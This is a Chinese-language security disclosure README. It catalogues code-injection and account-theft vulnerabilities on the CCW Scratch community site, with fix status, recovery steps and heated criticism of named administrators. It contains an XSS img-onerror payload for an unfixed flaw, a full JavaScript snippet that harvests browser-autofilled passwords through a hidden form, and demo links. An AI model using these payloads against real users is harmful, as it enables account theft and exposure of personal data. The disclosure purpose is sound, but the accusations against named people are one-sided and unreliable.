# CCW-Code-Injection

记录共创世界的代码注入漏洞（任意代码执行漏洞）、可能的盗号方式和防护方式建议。

若无特别标注，则本文提到的时间所属时区为北京时间（UTC+08:00）。

更新时间：2026年8月24日 17:59

该仓库创建于 2026年2月10日 ，此前被修复的漏洞可能没有记录。  

> [!WARNING]  
> **仅供学习研究用途，请勿用于网络攻击，违者后果自负！！！**  
> **For learning and research purposes only. Do not use for cyber attacks. Offenders will bear all the consequences!!!**

> [!TIP]  
> ↓ 如图所示，点击右上角的这个按钮查看目录  
> <img src="img/octicon-list-unordered.png" height="32">   

> [!TIP]  
> 建议使用 [CCW-Code-Injection-Risk-Warning](https://github.com/bddjr/CCW-Code-Injection-Risk-Warning) 防御部分漏洞。  

---

## 账号被黑了怎么办？

1. 立即关闭整个浏览器的所有窗口。
2. 使用浏览器访问账号设置 https://www.ccw.site/profile/setting ，找到“密码问题”，点击右侧的“修改”，然后尽快修改你的密码。
3. 访问 https://www.ccw.site/login ，然后使用新的密码登录你的账号。
4. 访问个人资料 https://www.ccw.site/profile/personal ，然后修改你的昵称和个性签名，然后点击“保存”。
5. 访问鸭鸭院长的主页 https://www.ccw.site/student/61039f14fffbe5461b880787 ，找到你的评论，然后点击右侧的三个点，点击“删除”，然后点击“确认”。
6. 在 https://learn.ccw.site/my-article 检查账号是否在被盗号期间发布了文章，如果有，请点击右侧红色的“下线”。
7. 清除浏览器缓存文件。
8. 使用 [QQ](https://im.qq.com/) 联系共创世界管理员（3026904139）申诉，说明你的账号被黑客入侵，并将账号id告诉他，并且说明你已修改密码。如果需要更多帮助（例如恢复被删除的作品），也可以求助管理员。

---

## 创作者学院的首页展示文章开头部分内容

状态：⚠️未修复

创作者学院 (https://learn.ccw.site) 的首页会展示文章的标题和开头部分内容，并且开头部分内容在展示前未能有效地过滤恶意代码。

该漏洞可用于执行任意代码（可用于盗号），也可以展示恶意SVG占用大量内存导致网页卡死。

只需访问创作者学院的“最新文章”即可中招（这种文章大概率不会被精选）。

恶意代码如下所示：

```html
<img src="//m.ccw.site/user_projects_assets/***.svg">
<img src=blob:x onerror="alert('不想上学')">
```

> [!NOTE]  
> CCW的WAF可能会过滤这样的内容，但只需一直点击鼠标，有概率成功发布。  
> CCW的WAF防不了攻击，还把不该过滤的正常内容过滤了，纯恶心人。  

发现这个漏洞的人: [Gtd232](https://github.com/Gtd232)

---

## oauth接口

状态：⚠️未修复

攻击者成功注入恶意代码后，可以借助已登录的会话创建一个新的会话，无需密码，返回的body里有token（会话临时密码），不会产生新的登录通知。

可用于盗号。

漏洞演示: [ccw-oauth-poc.js](ccw-oauth-poc.js)

---

## 钓鱼登录页面

攻击者成功注入恶意代码后，可能会创建一个登录页面，诱导用户输入账号密码，而恶意代码会悄悄地监视输入框，盗取密码。  

用户需提高反诈骗意识，不要在查看作品或编辑作品的页面输入CCW账号密码，也不要在域名不是 www.ccw.site 的钓鱼网站输入CCW账号密码。  

如果需要登录，请在新标签页访问CCW首页 https://www.ccw.site ，或者在新标签页访问CCW登录页 https://www.ccw.site/login 。

---

## 自动填充账号密码

这本该是浏览器的问题。  
如果用户没有更改浏览器的相关设置，只要 `<input>` 元素没有填写错误的 autocomplete 属性，浏览器就会自动填充已保存的账号密码，没有经过使用者的许可。  

攻击者成功注入恶意代码之后，可以盗取浏览器自动填充的账号密码，即使网页未显示输入框。  

> 但是，为什么 CCW 的登录界面不会自动填充密码？  
> 那是因为 CCW 的登录界面的 password 输入框的 autocomplete 属性填的是 "new-password" 。  

参考 https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Attributes/autocomplete

网站可以采取的防护措施：  
如果CCW网站登录支持2FA，像Github和npm那样的2FA，并且2FA也防暴力破解，应该会大大增加盗号难度。  
只要用户设置了2FA，攻击者即使盗到密码也不能直接在攻击者自己的设备上登录，那么攻击者即使盗了密码也没用，攻击行为只能发生在用户未关闭网页的情况下，用户只要关闭网页，攻击者就没办法继续攻击了。  
这虽然防不了钓鱼的登陆界面，但至少可以防止在完全不知情的情况下被盗取浏览器自动填充的密码。  
遗憾的是，截至本文更新时间，CCW还是没有2FA功能。  

> [!TIP]  
> 建议禁用浏览器的自动填充密码，或者改为 “在查看或填写网站密码之前提示设备登录选项。始终征求许可”  
> 
> ![3](./img/3.png)  

盗号程序演示：

> [!WARNING]  
> **仅用于测试自己的环境的安全性，不得用于盗取他人账号，违者后果自负！！！**  
>
> **For testing the security of your own environment only. Do not use it to steal others' accounts. Offenders will bear all the consequences!!!**  

```js
// 在浏览器的控制台粘贴代码，然后按键盘上的 enter 。
// 返回类型 { id: string, password: string } 。
// 如果返回的 id 和 password 都是空字符串，说明浏览器没有自动填充密码。
await new Promise((resolve, reject) => {
    var form, timeoutId;
    function removeElement() {
        try { if (form) form.remove() } catch (e) { }
    }
    function clearMyTimeout() {
        try { if (timeoutId) clearTimeout(timeoutId) } catch (e) { }
    }
    try {
        form = document.createElement('form');
        form.style.display = 'none';
        form.innerHTML = (
            `<input type=text name=id autocomplete=username>` +
            `<input type=password name=password autocomplete=current-password>`
        );
        function res() {
            try {
                const out = Object.fromEntries(new FormData(form));
                removeElement();
                resolve(out);
            } catch (e) {
                removeElement();
                reject(e);
            }
        }
        function oninput() {
            if (form.lastChild.value && form.firstChild.value) {
                clearMyTimeout();
                res();
            }
        }
        form.firstChild.addEventListener('input', oninput)
        form.lastChild.addEventListener('input', oninput)
        document.body.appendChild(form);
        // 3 秒没填充就自动返回
        timeoutId = setTimeout(res, 3000);
    } catch (e) {
        removeElement();
        clearMyTimeout();
        reject(e);
    }
})
```

> [!NOTE]  
> 已知该漏洞被 “不想上学” 利用过，详见 [自动填充账号密码-不想上学.md](自动填充账号密码-不想上学.md)  

---

## 阿里云OSS存储桶文件覆盖漏洞

状态：未知

共创世界官方没有控制好OSS存储桶的权限，导致攻击者可以利用该漏洞，将已有文件覆盖成任意文件，造成严重的后果。

已知有攻击者利用该漏洞，覆盖以下内容：
- 素材集市的扩展  
  对社区造成的影响最大，扩展被替换成恶意代码，让本该可以信任的扩展变得不可信，导致更多用户中招。  
- 作品文件  
  曾被用于在 cave.io 中插入 console.log 代码。  
- 用户头像
- 创作者学院文章封面
- 创作者学院图标
- GameJam 战队封面

已知该漏洞于 2025年9月21日 被 “孟夫子驾到” 发现并反馈给官方，然而官方不把这当回事。

直到 2026年4月19日 ，攻击者 “不想上学” 成功破解了阿里云OSS存储桶的前端签名机制，并于2026年5月开始利用该漏洞。  

随后，2026年5月31日凌晨，官方紧急启用了OSS覆写保护。

然而，因为OSS覆写保护影响了西瓜创客的业务，所以官方再次关闭该功能，导致漏洞再次出现。

于是，攻击者再次利用该漏洞发起攻击。

又因为漏洞的影响实在太大，官方再次修复该漏洞（但没完全修复）。

官方已尝试恢复受影响的文件，但目前仍有部分受影响的文件未恢复。

再后来，攻击者又用该漏洞覆盖了GameJam战队封面，于是官方修复了GameJame战队封面能被覆盖的漏洞。  

暂未确认漏洞是否完全被修复。  

参考：
- [ccw扩展覆写事件分析，此漏洞其实早就被发现了？](https://learn.ccw.site/article/77be3d26-dbf6-4d82-b323-5fc06033c600)
- [CCW扩展事件分析(二周目)](https://learn.ccw.site/article/6839840e-aa50-47d4-8028-ae932bddfee7)
- [【公告通知】近期扩展替换事件说明](https://learn.ccw.site/article/0173b23d-139d-4c48-ad98-0aa17b5d3b60)  
- [[近期被修复] oss权限控制漏洞使作品可被越权覆写](https://github.com/bddjr/CCW-Code-Injection/issues/4)  

OSS存储桶网址: https://zhishi.oss-cn-beijing.aliyuncs.com

加载存储桶的文件时使用的CDN网址:
- https://m.ccw.site
- https://m.xiguacity.cn

攻击证据截图：

![12](img/12.jpeg)

---

## SVG

### 基于 Scratch 编辑器编辑造型的代码注入攻击：  

状态：✅已修复  

参考 https://muffin.ink/blog/scratch-vulnerability-disclosure/  
漏洞演示 https://www.ccw.site/detail/69f73e772a7d36316189ef73  

该漏洞可以在编辑器编辑造型或背景的页面执行任意代码，可用于盗号。

### 基于 iframe + svg 的代码注入攻击：  

状态：✅已修复

⚡立即中招，几乎没有反应时间。  
如果在浏览器里直接用一个标签页打开 svg ，浏览器会执行 svg 里的 JS 脚本。同理，在没有保护措施的 iframe 里加载 svg 也会立即执行脚本。  
漏洞演示：https://m.ccw.site/user_projects_assets/a8039314e7b97ea48e176b34090b680e.svg  
已知登录 www.ccw.site 时的 Set-Cookie 响应头是这样的
```
Set-Cookie: token=XXXXXXXXXXXXXXXX60816ba55659e776ec2d3be9; Path=/; Domain=.ccw.site; Max-Age=2592000; Expires=Tue, 02 Jun 2026 12:57:16 GMT; HttpOnly
```
因此，在 m.ccw.site 加载的 svg 里执行的脚本可以携带有效的 token 请求 CCW 接口。  
设想的场景：  
黑客在 learn.ccw.site 使用 iframe 嵌入来自 m.ccw.site 的 svg ，然后这个 svg 里有恶意代码，并且会伪装，表面上看这好像就是个 iframe 在显示b站的视频，背后其实已经把浏览器自动填充的密码、手机号、实名认证的姓名、身份证前两位和后两位等信息打包并发送到黑客的服务器了。  

**这比加载 Gandi IDE 再执行恶意脚本还要快很多很多倍，受害者根本来不及反应。**  

![0](./img/0.png)

![1](./img/1.png)

![2](./img/2.png)

该漏洞已被攻击者利用，然后 [HCN（官方程序员）](https://www.ccw.site/student/5d47fec31c94e579b89cd259) 中招，随后修复了该漏洞。

官方采用了该文章提供的修复方案，即添加以下响应头：  
```
Content-Security-Policy: script-src 'none'
```

---

## 未上架到“Gandi扩展库”的扩展

未上架到“Gandi扩展库”的扩展就是第三方的脚本，它并没有运行在沙盒环境里，因此漏洞是十分明显的。

关于它的加载方式，有以下情况：

### detail页面

以前会在加载作品的时候直接执行第三方的脚本，然后才在用户点击 “立即运行” 的时候询问是否运行。  
这样的漏洞是非常明显的，脚本没有经过用户同意，就已经执行。  

现在在加载扩展之前就会警告，只有用户点击 “继续运行” 才会运行扩展的脚本，降低了安全风险。  

### player页面

状态：✅已修复

该页面用于手机版，不会弹出扩展警告，可用于零点击立即执行任意代码。

漏洞演示: https://www.ccw.site/player/6a5309e5d4bf1642fe07b93c?autorun=1&fullscreen=false

信息来源: [#1](https://github.com/bddjr/CCW-Code-Injection/issues/1)  

### PlayerWithInRouter页面

该页面用于展示GameJam战队投稿作品，会被嵌入到GameJam战队页面。

该页面需要手动点击“立即运行”，但运行后没有扩展警告弹窗。

漏洞演示: https://www.ccw.site/PlayerWithInRouter/6a5309e5d4bf1642fe07b93c?projectLink=https://m.ccw.site/user_projects_sb3/199431844/18847bed1e8a633032b955cf6f48b07e.sb3&simple=123

### embed页面

用户手动点击运行作品后，该页面会立即加载作品，然后自动执行扩展的任意代码，然后自动运行作品，不会弹出扩展警告。

现在该页面已无法运行作品，因此该漏洞被修复。

### 编辑器页面

例如：
> /creator  
> /gandi  

以前，这些页面在加载项目的时候会立即加载并执行扩展脚本，不会经过用户同意，因此漏洞仍然明显。

> 【这部分灰色的文字可能是过时的内容】  
> 攻击者可以利用 /creator 或 /gandi 会立即加载作品的特性，在加载作品的时候执行第三方扩展脚本。  
> 用户只需要访问创作页的链接，就会将自己的账号暴露在风险之中。  
> 
> 对应的，在创作者学院的文章里，可以插入 iframe ，而 iframe 能立即访问 /creator 或 /gandi ，形成了漏洞链，用户仅需点开文章，就会暴露在风险之中。  
> 
> 当然了，创作页执行上述操作，并不需要使用第三方扩展，只需要使用 CCWData 的代码注入漏洞，配合 “当计时器 > -1” 的帽子，就可以在浏览器访问链接后立即执行任意代码。

现在，编辑器页面只有在自己是作品的作者，或者自己参与协作的时候不会有警告。

但即使这样，该漏洞仍存在被利用的风险。

---

## 创作者学院的iframe

状态：⚠️未修复  

部分攻击形式可以借助创作者学院嵌入iframe，形成漏洞链，受害者在已登录的状态下，点击文章就会中招。  

创作者学院的前端编辑器并不能直接插入任意站点，例如尝试插入 `https://example.com` ，它会提示：暂时只支持bilibili和西瓜视频以及站内链接  

查找并分析js文件  
https://learn.ccw.site/_next/static/chunks/708-9a7dbfbb32eca7d3.js  
https://learn.ccw.site/_next/static/chunks/5191-e0df96b8928838d4.js  
https://learn.ccw.site/_next/static/chunks/app/(normal)/home/layout-a9cb46b1ff2d4762.js  

```js
var r, c, a = n(23891), i = "2023-07-20 10:30:00", s = "64b8c81969db2747de4502be", o = ["https://scratch.mit.edu", "https://youtube.com", "https://www.facebook.com", "https://www.twitch.tv", "https://twitter.com", "https://qa.cocrea.world", "https://www.ixigua.com", "https://ixigua.com", "https://bilibili.com", "https://player.bilibili.com", "https://www.bilibili.com", "https://www.ccw.site", "https://ccw.site", "https://learn.ccw.site", "https://learn-qa.xiguacity.cn"], u = function(t) {
    try {
        var e = new URL(t).origin;
        if (o.includes(e) || e.includes("ccw.site") || e.includes("xiguacity.cn"))
            return !0;
        return !1
    } catch (t) {
        return !1
    }
}
```

创作者学院前端支持插入的 URL origin ：  

```js
[
  // 境内不能直连的
  "https://scratch.mit.edu",
  "https://youtube.com", // 重定向到 www.youtube.com
  "https://www.facebook.com",
  "https://www.twitch.tv",
  "https://twitter.com", // 重定向到 x.com

  // 已无 DNS 解析
  "https://qa.cocrea.world",

  // 西瓜视频已改名为抖音精选，以下旧域名会重定向到 www.douyin.com/jingxuan
  // 目前为止没看到有人嵌入这个网站的视频
  "https://www.ixigua.com",
  "https://ixigua.com",

  // bilibili
  "https://bilibili.com",
  "https://player.bilibili.com",
  "https://www.bilibili.com",

  // CCW
  "https://www.ccw.site",
  "https://ccw.site",
  "https://learn.ccw.site",
  "https://learn-qa.xiguacity.cn" // 已无 DNS 解析
]
```

或者 origin 包含 "ccw.site" 或 "xiguacity.cn" 。  

仅在编辑器里插入的时候会校验，但查看文章的时候加载iframe前不会校验。  
我不知道服务器会不会校验。  

幸运的是，在创作者学院发布这种含有 iframe 的文章，如果造成了恐慌，文章可能会在一天之内被下架，此后作者发文章可能再也不会自动过审。  

---

## CCWData

状态：⚠️未完全修复  

Gandi云数据扩展 (CCWData) 的旧版本存在前端代码注入漏洞（任意代码执行漏洞）。

2026年5月21日 16:50:39 发布的新版扩展已修复该漏洞，多数页面会加载已修复漏洞的版本，但仍有少量页面会加载未修复该漏洞的旧版扩展。

`/scratch-player` 页面用于分享未发布的作品，但该页面加载的Gandi云数据扩展是早于 2026年3月9日 的版本，所以该漏洞未完全修复。  

[查看 2026年3月9日 之前的逻辑](./before-20260309.md)  

[查看 2026年5月21日 之前的逻辑](./ccwdata-before-20260521-165039.md)  

修复后，相关积木会直接调用新版的积木。相关代码如下  

```js
{
    key: "getValueInJSON",
    value: function(t) {
        this.doNotLogError = !0;
        var e = this.getValueInJSON_2(t);
        return this.doNotLogError = !1,
        e
    }
}
```

```js
{
    key: "setValueInJSON",
    value: function(t) {
        this.doNotLogError = !0;
        var e = this.setValueInJSON_2(t);
        return this.doNotLogError = !1,
        e
    }
}
```

js文件 [20260521.scratch3_ccw_data.9ff72c43.prettyprint.js](20260521.scratch3_ccw_data.9ff72c43.prettyprint.js)

---

## list_sessions接口

状态：✅已修复  

```
POST https://community-web.ccw.site/students/list_sessions?page=1&perPage=20&sortField=createdAt&sortType=DESC
```

这个接口的漏洞十分明显，攻击者只需要知道如何借助心跳接口获取 HmacMD5 的 key ，就可以搞定 A 请求头和 B 请求头，然后请求这个接口，获取当前用户的 token ，从而盗号。  
配合代码注入漏洞，形成漏洞攻击链。

CSense（自称“安全审计工具”的外挂脚本）的作者 [熊谷·凌(FurryR)](https://github.com/FurryR) 曾多次强调 CSense 无法盗取用户的密码，却隐瞒了这一事实。  
早期 CSense 利用该漏洞，将 CSense 使用者的登录信息和 token 发送给 CSense 的作者。

该漏洞在 2026 年 1 月 16 日 被修复，攻击者不能再借助该接口获取 token ，但仍可以获取登录时的时间、IP地址、浏览器版本，问题不大。

> [!NOTE]  
> 如图所示。  
> 这个漏洞已经存在很长时间，如果我不这么催，官方会修吗？  
> 官方是有多心虚才会跑来我的评论区删我的评论？  
> 搞得好像只要忽悠用户就能解决问题似的。  
>
> ![5](img/5.png)  
> 
> ![4](img/4.png)  

---

## login接口

状态：✅已修复  

```
POST https://sso.ccw.site/web/auth/login-by-password
```

该接口会在用户登录时响应的 json 里暴露当前的 token ，但它不会被存储到本地。  

攻击者在前端成功执行恶意代码之后，创建钓鱼登录页的时候，不仅可以截获用户的账号密码，还可以用这个bug截获token。  

于是在钓鱼登录页里，登录请求是用户的浏览器发起的，而不是攻击者的服务器。  

CCW服务器记录到的ip地址也是用户登录时使用的ip地址，攻击者可以拿这个token盗号，登录会话记录里不会有异地ip地址。  

> [!NOTE]  
> 我将该漏洞反馈给Arkos，同时也将 Set-Cookie 缺少 Secure 的漏洞反馈给他。  
> 现在官方已修复这两个漏洞。  

---

## 个人信息接口

```
POST https://community-web.ccw.site/students/self/detail
```

用户在已登录的状态下，每次访问 www.ccw.site 都会请求这个接口。  

攻击者成功注入恶意代码之后，请求该接口可以获取敏感信息，包括但不限于：
- 该账号绑定的手机号
- 该账号绑定 QQ 时的 QQ 昵称
- 该账号实名认证的姓氏
- 该账号实名认证的全名的长度
- 该账号实名认证的身份证的前两位和后两位

在官方尝试修复之前，该接口甚至可以获取：  
- 该账号实名认证的全名

---

## 创作者学院的localStorage

创作者学院会在 `localStorage['persist:root']` 里保存最近查看文章时使用的账号的敏感信息，参考 [个人信息接口](#个人信息接口) 。

即使用户已经退出登录，这里也会继续保存这些内容。

---

## 个人资料的“学校”字段

状态：✅已修复

攻击者成功在受害者的环境注入恶意代码后，会将个人资料的“学校”字段修改成很长的字符串，导致用户个人设置的个人资料时，页面无响应（卡死），用户难以使用常规路径修改自己的昵称和密码。

该漏洞不能用于盗号，但会对被盗号的受害者造成很大的困扰。

参考: [论被不想上学“盗号”后为什么打不开个人设置](https://learn.ccw.site/article/8f2dd50e-f564-4447-8306-2536c43d8522)  

现在前端已限制仅渲染前50个字符，因此该漏洞已被修复。

---

## 素材集市的扩展恶意打分评论

状态：✅已修复

该漏洞不能用于注入恶意脚本，因此不能用于盗号。  

[素材集市](https://assets.ccw.site/)的扩展打分评论渲染器要求评论的第一行必须以 `-评分:` 开头。

正常的扩展打分评论是这样的：

```
-评分: 5
-标签: 安全
打个分
```

如果缺少 `-评分:` ，会导致渲染器抛出错误，整个页面白屏，中间显示一行黑色的文字：  

```
Application error: a client-side exception has occurred (see the browser console for more information).
```

攻击者可以请求接口，在“扩展打分”发送缺少评分的恶意评论，例如：

```
-没有评分
-没有标签
我“不小心”把你扩展炸了
```

即使账号已封禁，该打分评论仍未删除，仍会导致页面无法正常显示。  

受影响的页面例如 https://assets.ccw.site/extension/csb3.2

---

## 个人主页或动态页面注入style

状态：✅已修复

该漏洞的出现是因为渲染简介时没有移除 html 元素的 `style` 和 `class` 属性，导致用户可以进行以下操作：
- 用 个人简介 给 个人主页 注入样式
- 用 代表作 给 个人主页 注入样式
- 用 作品简介 给 动态 注入样式

注入了样式的元素可以覆盖整个页面。  

该漏洞被广泛用于恶搞或装饰。

该漏洞不能用于执行任意代码，所以不能零点击盗号，但理论上可以诱导用户点击 `<a>` 标签打开能执行任意代码的页面。

参考：
- [篡改猴CCW解决自我介绍恶意CSS遮罩](https://learn.ccw.site/article/c9826e86-50f8-4a30-b081-b38ae5c8c626)  

---

## BBcode代码注入漏洞

状态：✅已修复

参考 [BBcode教程](https://learn.ccw.site/post/7d129e01-e30a-4d88-92d2-320b555ed0f5) 的评论区。

---

## 官方的承诺

### 节选自《[重要通告]保护账号安全，做对这几件事...》  

> [!NOTE]  
> 该文章发表时，list_sessions 接口盗 token 的漏洞未修复。  
> 鸭鸭院长（CCW官方）试图忽悠用户，掩盖问题。  

对此，许多肝酱担忧是否因账号被盗导致了信息泄露？结合前文所示，盗号者没有任何渠道能够获取肝酱们的安全信息。

### 节选自《CCW共创世界隐私政策》  

> [!NOTE]  
> 这话 CCW 官方自己信吗？  

版本更新日期：2021年06月01日  
本政策生效日期：2021年06月01日  

**五.我们如何存储和保护您的个人信息**  
（二）个人信息的保护  
1. 平台会采取合理可行的措施，尽力避免收集无关的个人信息。平台只会在达成本政策所述目的所需的期限内保留您的个人信息，除非法律有强制的存留要求。在您的个人信息超出保留期间后，平台会根据适用法律的要求删除您的个人信息，或使其匿名化处理。

2. 我们已通过了公安部信息安全等级保护三级认证，并与监管机构、第三方测评机构建立了良好的协调沟通机制，及时抵御并处置各类信息安全威胁，为您的信息安全提供全方位保障。

3. 平台已制定个人信息安全事件应急预案，定期组织内部相关人员进行应急响应培训和应急演练，使其掌握岗位职责和应急处置策略和规程。

4. 如发生个人信息安全事件后，平台将按照法律法规的要求并最迟不迟于 30 个自然日内向您告知：安全事件的基本情况和可能的影响、平台已采取或将要采取的处置措施、您可自主防范和降低风险的建议、对您的补救措施等。事件相关情况平台将以邮件、信函、电话、推送通知等方式告知您，难以逐一告知个人信息主体时，平台会采取合理、有效的方式发布公告。同时，平台还将按照监管部门要求，上报个人信息安全事件的处置情况。

5. **由于技术的限制以及可能存在的各种恶意手段，在互联网行业，即便竭尽所能加强安全措施，也不可能始终保证信息百分之百的安全，我们将尽力确保您提供给我们的个人信息的安全性。请您知悉并理解，您接入我们的服务所用的系统和通讯网络，有可能因我们可控范围外的因素而出现问题。因此，我们强烈建议您采取积极措施保护个人信息的安全，包括但不限于使用复杂密码、定期修改密码、不将自己的账号密码等个人信息透露给他人。**

---

## 鸭八分钱

鸭鸭院长（共创世界社区管理员）的所作所为**令人心寒**。  

2025年12月，鸭鸭院长不仅没有真正重视盗号问题，还忽悠用户，掩盖盗号问题。  

鸭鸭院长被bddjr（本文作者）反驳后，鸭鸭院长选择了删评，但并没有修改公告文章里的错误内容。

然后，bddjr发布了一篇漏洞演示的文章，演示了 文章+iframe+CCWData 漏洞链，随后不到1天就被下架，并且被禁止发文章自动审核。  

然后，鸭鸭院长面对用户的质疑，还在说些车轱辘话忽悠用户，随后bddjr使用更激进的口吻反驳鸭鸭院长。

鸭鸭院长对此感到很生气，凌晨两点多不睡觉，跑到bddjr的评论区删评论，还故意把bddjr发布的教用户使用“高级画笔v2”扩展自带的“上传图片”功能的教程作品以“广告”为由下架。

鸭鸭院长这么做完全没有正当理由，仅仅只是因为恨bddjr揭露真相。

奇怪的是，2026年7月4日，鸭鸭院长发布关于“不想上学”的公告后，主动关注了bddjr，但并没有恢复bddjr的发文章自动审核。

鸭鸭院长甚至主动置顶了“大群安全组”主要代表人物iq的言论，尽管iq的言论完全站不住脚。

CCW作为Scratch编程社区，不鼓励理性思考、实事求是，反而任由 **无脑起哄、傻子共振、无脑赢学和道德绑架** 的言论随意传播，令人心寒。

---

## 肖轶翔也曾是黑客

肖轶翔是共创世界（成都普罗可布科技有限公司）和西瓜创客（成都娄外科技有限公司）的创始人、法定代表人。

在[《20多岁就财务自由的人，是被怎么教育出来的？》](https://news.qq.com/rain/a/20250707A04F2E00)里，肖轶翔自述：

> 高中，为了验证自己的编程技术，我黑进了当地一家重要公司的官网，结果引来警察叔叔给我上了第一堂课。  

这放在CCW里的威力就像理想广州花都销售中心像乱停的理想车一样，企业文化这一块。

---

## 来自官方程序员的认可

![11](img/11.png)

---

## 特别感谢

- 孟夫子驾到 (BenPaoDeXiaoZhi)  
  [Github](https://github.com/BenPaoDeXiaoZhi) | [CCW](https://www.ccw.site/student/63c2807d669fa967f17f5559)  
  提供高质量内容参考，并且主动以提交issue的方式向本文补充更多信息。  

- Gtd232  
  [Github](https://github.com/Gtd232)  
  发现部分漏洞，并且在作者尝试破解CCW的A和B请求头签名机制时为作者提供线索。

- XiaoChen003Hao (xiaochen004hao)  
  [Github](https://github.com/xiaochen004hao) | [CCW](https://www.ccw.site/student/643bb84051bc32279f0c3fa0)  
  在“RenderTheWorld”扩展被攻击者覆盖成恶意代码后，发布 [文章](https://learn.ccw.site/article/8f2dd50e-f564-4447-8306-2536c43d8522) 说明“打不开个人设置”的原因，为本文提供了重要线索。  

- voyage200 (jexjws)  
  [Github](https://github.com/jexjws) | [CCW](https://www.ccw.site/student/64ba849b314bb1118e101130)  
  帮助作者破解CCW的A和B请求头签名机制。  

- Joy_Ful (JoyFul721)  
  [Github](https://github.com/JoyFul721) | [CCW](https://www.ccw.site/student/63a2ed71e9bc643fdde156b2)  
  不小心运行了被攻击者覆盖过的“RenderTheWorld”扩展导致被盗号后，主动向本文作者求救，为作者提供了重要线索。  

- HCN (sylarhcn) (CCW官方程序员)  
  [Github](https://github.com/sylarhcn) | [CCW](https://www.ccw.site/student/5d47fec31c94e579b89cd259)  
  对本文表示认可。  

---

## 版权

© 2026 半岛的蒟蒻bddjr

详见 [LICENSE.md](LICENSE.md)

---

## 相关文章

- [关于用户“不想上学”违法违规行为及后续处理情况的正式公告](https://learn.ccw.site/article/95a33e19-e13c-48ce-a0ef-89fffe8d192c)  
  [鸭鸭院长](https://www.ccw.site/student/61039f14fffbe5461b880787) 2026-07-04 05:09  

- [【公告通知】近期扩展替换事件说明](https://learn.ccw.site/article/0173b23d-139d-4c48-ad98-0aa17b5d3b60)  
  [共创世界产品汪](https://www.ccw.site/student/6008f86de6894d53dd63749f) 2026-06-26 20:28

- [账号被黑了怎么办？别慌，我教你](https://learn.ccw.site/article/d856bd13-0dec-412e-b6a9-ecf329f968f3)  
  [可可爱爱没有脑袋](https://www.ccw.site/student/6999b7dbfc898317568f6bb2) 2026-06-26 15:06

- [CCW扩展事件分析(二周目)](https://learn.ccw.site/article/6839840e-aa50-47d4-8028-ae932bddfee7)  
  [孟夫子驾到](https://www.ccw.site/student/63c2807d669fa967f17f5559) 2026-06-25 08:17

- [不想上学5月炸账号，6月炸编辑器😡](https://learn.ccw.site/article/f0ced395-b861-46aa-b1f1-e106af09340f)  
  [离离原上谱](https://www.ccw.site/student/68820f8f0fffab5209c5a665) 2026-06-24 14:46

- [【功能上新】安全通告](https://learn.ccw.site/article/3e7e506e-7688-4de6-a87d-64e4c31fcd85)  
  [共创世界产品汪](https://www.ccw.site/student/6008f86de6894d53dd63749f) 2026-06-17 15:37

- [ccw扩展覆写事件分析，此漏洞其实早就被发现了？](https://learn.ccw.site/article/77be3d26-dbf6-4d82-b323-5fc06033c600)  
  [孟夫子驾到](https://www.ccw.site/student/63c2807d669fa967f17f5559) 2026-05-31 17:53

- [论被不想上学“盗号”后为什么打不开个人设置](https://learn.ccw.site/article/8f2dd50e-f564-4447-8306-2536c43d8522)  
  [XiaoChen003Hao](https://www.ccw.site/student/643bb84051bc32279f0c3fa0) 2026-05-30 19:21

- [CCW 社区安全 Q&A](https://learn.ccw.site/article/51501436-87d5-4d4b-976e-2d00bbc50e9a)  
  [Chen-Jin](https://www.ccw.site/student/692538ef86bbc77f84e3b259) 2026-05-10 02:45  

- [不想上学 | Ccw逆天入 Wiki | Fandom](https://ccw-amazing-animals.fandom.com/zh/wiki/%E4%B8%8D%E6%83%B3%E4%B8%8A%E5%AD%A6)  

- [不想上学的所作所为](https://learn.ccw.site/article/957a30f1-3dfb-4037-a994-4c8499708511)  
  [纆默黑狗斯特-mmhgst](https://www.ccw.site/student/60cd5619fa5edd0db169e2b8) 2026-05-08 19:07  

- [为什么你的密码会被恶意扩展窃取？](https://learn.ccw.site/article/87737a20-a45d-4d41-b950-1af19dbc1ae7)  
  [往昔余庆](https://www.ccw.site/student/5db279a4483f207ab58b3929) 2026-05-08 02:28  

- [软弱无能的共创世界](https://learn.ccw.site/article/31b8737c-f6be-406b-9c9f-becf3fd3004a)  
  [纆默黑狗斯特-mmhgst](https://www.ccw.site/student/60cd5619fa5edd0db169e2b8) 2026-05-06 23:41  

- [如何屏蔽 CCW 里的无关网站以增加安全性？](https://learn.ccw.site/article/effd5854-9ae9-4483-8927-efaa4a9a7d79)  
  [往昔余庆](https://www.ccw.site/student/5db279a4483f207ab58b3929) 2026-05-05 21:03  

- [不是。你手机号停运了我咋盗你号啊。](https://learn.ccw.site/article/692893c5-8525-4744-bb4d-a782cb5505be)  
  [纆默黑狗斯特-mmhgst](https://www.ccw.site/student/60cd5619fa5edd0db169e2b8) 2026-05-05 19:15  

- [Every version of Scratch is vulnerable to arbitrary code execution](https://muffin.ink/blog/scratch-vulnerability-disclosure/)  
  [muffin.ink](https://muffin.ink) 2026-04-23 (时区：UTC-05:00) 

- [【社区公告】关于“账号安全”的通知](https://learn.ccw.site/article/998d3e07-7210-4b5a-ab6d-64ac84e3caef)  
  [共创世界产品汪](https://www.ccw.site/student/6008f86de6894d53dd63749f) 2026-04-13 19:20  

- [恶意扩展如何让你上钩？远远不止这些……](https://learn.ccw.site/article/5f06747c-fae9-4ed6-b69e-24016eedbfd3)  
  [浅_酱_](https://www.ccw.site/student/63d8837e6bc82a13fb855f0a) 2026-04-11 22:21  

- [Gandi内置的扩展有潜在使用eval函数执行任意js脚本的风险](https://learn.ccw.site/article/7d25e249-458a-4016-956f-d49cb315ca54)  
  [无心小白僵尸](https://www.ccw.site/student/66366121a7113d4ff035cd9c) 2026-02-23 12:33  

- [[重要通告]保护账号安全，做对这几件事...](https://learn.ccw.site/article/6af308a5-cb78-465c-bb1e-572c48f0fc5e)  
  [鸭鸭院长](https://www.ccw.site/student/61039f14fffbe5461b880787) 2025-12-08 17:09  

- [篡改猴CCW解决自我介绍恶意CSS遮罩](https://learn.ccw.site/article/c9826e86-50f8-4a30-b081-b38ae5c8c626)  
  [半岛的蒟蒻bddjr](https://www.ccw.site/student/60816ba55659e776ec2d3be9) 2025-07-15 21:01  

- [BBcode教程](https://learn.ccw.site/post/7d129e01-e30a-4d88-92d2-320b555ed0f5)  
  [白猫](https://www.ccw.site/student/6173f57f48cf8f4796fc860e) 2023-07-18
